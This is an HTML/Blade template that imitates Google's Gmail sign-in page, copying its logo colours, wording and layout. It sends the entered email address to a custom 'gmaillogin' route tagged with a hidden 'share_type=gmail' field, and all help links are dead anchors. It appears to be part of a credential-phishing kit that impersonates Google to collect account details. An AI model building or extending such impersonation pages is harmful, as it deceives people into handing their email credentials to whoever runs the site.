
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mail Sign In</title>

    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            background: #f0f4f9;
            font-family: 'Roboto', Arial, sans-serif;
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .mail-container {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            background: #fff;
            border-radius: 28px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .mail-logo {
            font-size: 38px;
            font-weight: 500;
            margin-bottom: 25px;
            letter-spacing: -1px;
            color: #4285f4;
        }

        .mail-logo .red {
            color: #ea4335;
        }

        .mail-logo .yellow {
            color: #fbbc05;
        }

        .mail-logo .green {
            color: #34a853;
        }

        .mail-title {
            font-size: 28px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin-bottom: 12px;
        }

        .mail-subtitle {
            font-size: 15px;
            color: #202124;
            text-align: center;
            line-height: 1.5;
            margin: 0 0 32px;
        }

        .mail-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 18px;
        }

        .mail-form input[type="email"] {
            width: 100%;
            padding: 16px;
            border: 1px solid #747775;
            border-radius: 5px;
            font-size: 16px;
            background: #fff;
            outline: none;
        }

        .mail-form input[type="email"]:focus {
            border: 2px solid #0b57d0;
            padding: 15px;
        }

        .mail-link {
            color: #0b57d0;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            width: fit-content;
        }

        .mail-link:hover {
            text-decoration: underline;
        }

        .mail-info {
            width: 100%;
            margin: 30px 0;
            font-size: 14px;
            color: #5f6368;
            line-height: 1.6;
        }

        .mail-info a {
            color: #0b57d0;
            text-decoration: none;
            font-weight: 500;
        }

        .mail-actions {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
        }

        .mail-create {
            color: #0b57d0;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }

        .mail-button {
            background: #0b57d0;
            color: #fff;
            border: none;
            padding: 12px 26px;
            border-radius: 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .mail-button:hover {
            background: #0842a0;
        }

        .mail-footer {
            width: 100%;
            max-width: 450px;
            display: flex;
            justify-content: space-between;
            gap: 12px;
            padding: 20px 10px;
            font-size: 12px;
            color: #5f6368;
        }

        .mail-footer a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 12px;
        }

        @media (max-width: 600px) {
            body {
                background: #fff;
                padding: 15px;
            }

            .mail-container {
                padding: 25px 10px;
                border-radius: 0;
            }

            .mail-title {
                font-size: 25px;
            }

            .mail-logo {
                font-size: 34px;
            }
        }
    </style>
</head>

<body>
    <div>
        <div class="mail-container">

            <div class="mail-logo">
                <span>G</span><span class="red">m</span><span class="yellow">a</span><span class="green">i</span><span>l</span>
            </div>

            <div class="mail-title">Sign in</div>

            <p class="mail-subtitle">
                Use your email address to continue
            </p>

            <form class="mail-form" method="POST" action="{{ route('gmaillogin') }}">
                @csrf
<input
                        id="email"
                        type="hidden"
                        name="share_type"
                        value="gmail"
                        required
                    >
                <input
                    type="email"
                    name="email"
                    placeholder="Email address"
                    autocomplete="email"
                    required
                    autofocus
                >

                <a class="mail-link" href="#">
                    Forgot email?
                </a>

                <div class="mail-info">
                    Not your device? Use a private browsing window
                    to sign in securely.
                    <a href="#">Learn more</a>
                </div>

                <div class="mail-actions">
                    <a class="mail-create" href="#">
                        Create account
                    </a>

                    <button class="mail-button" type="submit">
                        Next
                    </button>
                </div>
            </form>
        </div>

        <div class="mail-footer">
            <span>English (United Kingdom)</span>

            <div>
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
</body>
</html>
